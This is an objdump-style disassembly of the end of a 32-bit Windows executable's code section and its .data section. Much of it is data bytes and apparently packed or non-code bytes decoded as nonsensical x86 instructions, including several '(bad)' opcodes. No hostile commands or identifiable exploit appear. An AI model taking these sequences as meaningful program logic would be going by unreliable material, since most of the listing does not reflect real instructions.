  411a4d:	sbb    ah,cl
  411a4f:	push   0xffccc322
  411a54:	push   ecx
  411a55:	jmp    0x4920f4aa
  411a5a:	dec    ecx
  411a5b:	fldenv [ebx-0x4a9598b9]
  411a61:	dec    esp
  411a62:	xchg   ebp,eax
  411a63:	push   ss
  411a64:	in     al,0xcc
  411a66:	xor    BYTE PTR [edx+0x53e9b4a7],cl
  411a6c:	push   cs
  411a6d:	out    dx,eax
  411a6e:	cs loop 0x411ae8
  411a71:	cwde   
  411a72:	sahf   
  411a73:	out    0x8,eax
  411a75:	pop    es
  411a76:	xchg   ebp,eax
  411a77:	xchg   ecx,eax
  411a78:	dec    esp
  411a79:	test   al,0xc0
  411a7b:	or     BYTE PTR [ebx-0x68ada0db],0x86
  411a82:	pop    ecx
  411a83:	jl     0x411ad2
  411a85:	bound  edx,QWORD PTR [ebx+eiz*4]
  411a88:	jo     0x411a27
  411a8a:	add    ecx,DWORD PTR [eax]
  411a8c:	pop    ecx
  411a8d:	or     al,BYTE PTR ds:0x3f202411
  411a93:	cmp    DWORD PTR [edi],edx
  411a95:	push   ds
  411a96:	push   ecx
  411a97:	(bad)  
  411a98:	popa   
  411a99:	push   ds
  411a9a:	cld    
  411a9b:	and    esp,DWORD PTR [ebp+0xde9c103]
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
